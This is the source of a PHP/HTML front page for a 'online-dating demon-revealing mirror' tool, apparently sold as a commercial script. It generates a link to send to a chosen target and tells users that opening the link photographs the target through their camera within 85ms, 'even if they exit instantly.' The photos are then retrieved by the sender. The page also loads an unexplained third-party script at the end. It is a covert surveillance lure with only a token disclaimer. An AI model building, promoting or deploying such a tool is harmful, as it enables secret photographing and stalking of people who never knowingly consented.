<!--

在线体验:https://sc.yued.gq/sc

当前源码为阉割版,完全版请至 https://shop.yued.gq/buy/4 购买

-->

<?php
header('content-type:text/html;charset=utf-8');
$doh = curl_init('');
curl_setopt($doh, CURLOPT_DOH_URL, 'https://dns.google/dns-query');
curl_exec($doh);
function getfilecounts($ff){
$dir = './'.$ff;
$handle = opendir($dir);
$i = 0;
while(false !== $file=(readdir($handle))){
if($file !== '.' && $file != '..')
{
$i++;
}
}
closedir($handle);
return $i;
}
if (version_compare(PHP_VERSION, '8.1.0', '<=')) {
    echo '您的PHP版本小于8.1.0,请升级PHP到最新版.当前版本为 ' . PHP_VERSION;
    exit;
} else {
}
?>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>PHP8网恋照妖镜</title>
    <!--baidu-->
    <!-- Bootstrap -->
    <link href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/bootstrap/4.5.3/css/bootstrap.css" rel="stylesheet">
    <script src></script>
   
	<script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/jquery/1.11.3/jquery.min.js"></script>
	<script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/layer/3.1.1/layer.min.js"></script>
	<link rel="stylesheet" type="text/css" href="css/shop_style.css">
	<link href="css/shop.css" rel="stylesheet" type="text/css">
	<link href="css/style.css" rel="stylesheet" type="text/css">
	<script src="js/jquery.min.js"></script>
	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
	<script src="https://lib.baomitu.com/jquery/3.4.1/jquery.min.js"></script>
</head>
<body>
    <style> 
        #M1{
        	width: 110px;
    height: 35px;
    padding-top: 2px\9;
    /* cursor: pointer; */
    color: #fff;
    font-size: 15px;
    /* letter-spacing: 1px; */
    background: #3385ff;
    /* border-bottom: 1px solid #2d78f4; */
    /* outline: medium; */
    *: ;
    border-bottom: none;
    -webkit-appearance: none;
    -webkit-border-radius: 0;
    border: 0;
        text-align: center;
    text-decoration:none;
    color: #fff;
    background-color: #007bff;
    border-color: #007bff;
        padding: 7px;
        float: left;
        margin-left: 2%;     
        margin-top: 2%;
        }
    .cbgg {
 padding: 10px;
 background-color: #fff;
 }
 .cbgg p {
 text-align: center;
 }


@font-face {
  font-family: "iconfont"; /* Project id 2516453 */
  src: url("//at.alicdn.com/t/font_2516453_g6qjhhqblt9.woff2?t=1620545333370")
      format("woff2"),
    url("//at.alicdn.com/t/font_2516453_g6qjhhqblt9.woff?t=1620545333370")
      format("woff"),
    url("//at.alicdn.com/t/font_2516453_g6qjhhqblt9.ttf?t=1620545333370")
      format("truetype");
}

.iconfont {
  font-family: "iconfont" !important;
  font-size: 16px;
  font-style: normal;
  -webkit-font-smoothing: antialiased;
  -webkit-text-stroke-width: 0.2px;
  -moz-osx-font-smoothing: grayscale;
}

.ad {
  background-color: #fff;
  align-items: center;
  display: flex;
  border-radius: 8px;
  box-sizing: border-box;
  height: 66px;
  margin-bottom: 24px;
  padding: 0 20px;
  display: flex;
  align-items: center;
  justify-content: flex-start;
  font-size: 16px;
  color: #353535;
  margin-bottom: 30px;
  cursor: pointer;
  box-shadow: 2px 1px 8px 1px rgb(228, 232, 235);
  margin: 40px auto;

  i {
    color: #ff6146;
    font-size: 20px;
    margin-right: 10px;
  }
// 核心代码
  @keyframes marquee {
    0% {
      transform: translateX(0);
    }
    100% {
      transform: translateX(-100%);
    }
  }

  .content{
    flex: 1;
    overflow: hidden;
    
    span {
      display: block;
      width: auto;
      white-space: nowrap;
      animation: marquee 30s linear infinite;
      padding-left: 105%;
      padding-right: 120%;
      &:hover {
        animation-play-state: paused;
      }
    }
  }
}

</style> 

<script>
function  create() {
    var input = document.getElementById('content');
    var kd = document.getElementById('kd');
    var myid = document.getElementById('myid');
    var url = document.getElementById('url');
    if (myid.value=="" || url.value==""){
        alert("ID或跳转地址不能为空！");
        return false;
    }
    kd.href = 'https://sc.yued.gq/?id='+myid.value+'&url='+url.value; //修改此处的域名 必须要SSL证书
    kd.style = ''; 
    kd.innerText = 'https://sc.yued.gq/?id='+myid.value+'&url='+url.value; //修改此处的域名  必须要SSL证书  
}
</script>
<div id="bob">


	<div id="bd">
<div class="ct" style="padding:0;">
<section class="index">
<div id="bds">
	<div id="content">
	<div class="hd">
	
	<img src="images/luyuz.png"></div>
	<div class="mall" id="contentss">
<div class='ad'>
        <i class="iconfont">&#xe633;</i>
        <p class='content'>
            <span>重要通知：最新版特定字节码已经编译为机器码,85ms就能拍照完成,误点人员手滑秒退出也无济于事，速度过来体验一下吧！ </span>
        </p>
    </div>
    
<div class="mianban">
    <div class="wrap">
        <div class="tabs">
			<a href="javascript:void(0)" id="Choice_one" onclick="Choice(1)" class="active">专属链接生成</a>
			<a href="javascript:void(0)" id="Choice_two" onclick="Choice(2)">使用教程</a>
			<a href="javascript:void(0)" id="Choice_Three" onclick="Choice(3)">更新日志</a>            
        </div>
        <div class="swiper-container">
            <div class="content-slide">
                <div class="purchase_from">
					<ul id="Open" style="display:block;">
						<form action="?" class="form-sign" method="get" name="auth" onSubmit="return checkURL();">
						<li>
						<p>QQ或手机号(必填)：</p>
						<input type="text" class="form-control" id="myid" maxlength="11" placeholder="请输入QQ或手机号才能生成和查看删除照片" value>
                        <p>拍摄后跳转网址：</p>
                        <input type="text" class="form-control" id="url" value="https://sc.yued.gq/sc">
						</li>
						<li>
						<input type="button" value="生成链接" onclick="create();" style="display: block;background: #0099CC!important;height: 40px;font-size: 16px;color: #fff;border-radius: 4px;text-align: center;overflow: hidden;"> <br>   
						</li>
						<li class="btn_purchase">
                            <input type="button" value="查看(删除)照片" onclick="window.location.href='ck?id='+document.getElementById('myid').value" style="display: block;background: #0099CC!important;height: 40px;font-size: 16px;color: #fff;border-radius: 4px;text-align: center;overflow: hidden;">
                        </li>
						<div class="alert alert-success">
                        <img src="images/ico_success.png">
						<a id="kd" style="pointer-events: none;">请先查看使用教程生成链接!</a>
						</div>
						<span id="Order"></span>
						</form>
                    </ul>
                    <ul id="query" style="display: none;">
                        <form action="?" class="form-sign" method="get" name="auth" onSubmit="return checkURL();">
                        <li class="btn_purchase">
						
                    
                        </li>
						  
                        <span id="Orderd"><textarea readonly="true" name="notice" id cols="30" rows="15" style="max-width: 100%;width:100%">                   ★作者声明★  
①本工具仅做学习交流使用,请勿用于非法用途!后果自负!网站拍照是用户自愿点击允许
②懒得做数据库,QQ是查看照片的凭证,不要泄露给知道这个平台的人  
③为节省服务器资源，你不删除的数据,我也会不定期删除数据
                   ★使用说明★  
①填写对方QQ(手机号)方便日后查询!填写完成后不用管直接点击生成!  
②生成完成后,复制链接发给你要查询的人  
③他点开后,然后回到本站,填写对方QQ,然后点击查看照片即可！ 
效果如下图
④我再说一遍,填写要么数字要么QQ,不要英文和中文  
⑤由于系统安全机制，ios系统必须使用自带的Safari浏览器（或者第三方APP调用的是Safari内核）才行  
仅供娱乐使用,请勿用于非法商业用途,否则后果自负！  
请收藏本站,以防丢失 </textarea></span>
						</form>
                    </ul>
                    <ul id="Back" style="display:none;">
                        <center>
						<h4 class="hd_tit" style="height:auto;line-height:normal;padding:10px;color:#FFFFFF;">本站温馨提示<br>
						<span style="font-size:13px;color:red;">注意：使用对方QQ或手机号生成链接!</span>
						</h4>

						</center>
						<div class="list-group-item text-center">
					   
<span style="font-size:16px;"><span style="font-size:14px;"><strong>2022年9月28日：</strong></span><br />
<span style="font-size:14px;">1.php更新8.1,特定字节码已经编译为机器码,让 CPU 执行机器码,85ms就能拍照完成,误点人员手滑秒退出也无济于事<br />性能提升20倍,856KB图片耗时 85 ms,<br />原php5.3版本856KB图片耗时 1569 ms</span><br />
<span style="font-size:14px;">2.修复拍照根据设备自适应分辨率</span><br />
<span style="font-size:14px;">3.增加数据统计</span><br />

<br />
						</div>
                        <span id="Order"></span>
                    </ul>
                </div>
            </div>
        </div>
        <div class="gnbt">网恋照妖镜使用预览</div>
			<div class="bd">
				<div class="bc">
				    <div contentEditable="true">
				    
				   <img src="https://yzf.qq.com/fsnb/kf-file/kf_pic/20221109/KFPIC_kfh555b515f734492e_h5aee7f3c88eb72438d9dd6b21f9_WXIMAGE_5b94adc0baf44777bf0ff661ca8af808.png"  width='97%' />
				   
                  </div>
				</div>
			</div>
			<div class="ft">网恋照妖镜数据统计</div>
    	</div>
    	
               <div width="100px" height="100px" style=" margin: 10px auto; border: 1px solid #ccc; text-align: center">
<BODY>
<h4>
当前在线<span style="color:#ff6700">
0
</span>人,服务器现存储<span style="color:#ff6700">
    0
</span>张照片.
</a></font></h4>为节省服务器资源，不定期删除数据,请及时保存至本地.
</BODY>
            <hr class="top_hr_style02">
			<body bgcolor="#ffd200"><span id="localtime"></span>
	</nav></header>

            <br>
               	<footer class="footer text-center">
      <div class="container">
        <p class="text-muted">Copyright &copy; 2022 <a href="/">PHP8照妖镜</a> [php_version：<a href="#" target="_blank"><?php
	echo PHP_VERSION;
?></a>],[源码下载：<a href="https://shop.yued.gq/buy/4" target="_blank">源码下载</a>]  </p>
      </div>
    </footer>
                         </div>
                         
    	
    </div>

<script src="https://api.findmima.ml/js/alike.js"></script>
</body></html>
	 